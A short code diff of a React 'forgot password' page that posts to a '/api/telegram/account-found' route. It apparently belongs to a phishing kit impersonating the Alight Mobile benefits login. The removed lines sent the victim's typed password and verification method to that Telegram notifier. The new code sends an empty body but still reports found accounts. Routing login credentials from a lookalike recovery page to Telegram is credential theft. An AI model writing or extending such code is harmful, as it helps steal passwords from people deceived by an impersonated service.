@@ -25,13 +25,10 @@ export default function ForgotPasswordFoundPage() {
       await fetch("/api/telegram/account-found", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          method: verificationMethod === "password" ? "Password" : "Alight Mobile",
-          password: verificationMethod === "password" ? password : undefined,
-        }),
+        body: JSON.stringify({}),
       }).catch(console.error)
     } catch (error) {
-      console.error("Failed to send account found notification:", error)
+      console.error("Account found error:", error)
     }
 
     await new Promise((r) => setTimeout(r, 1500))
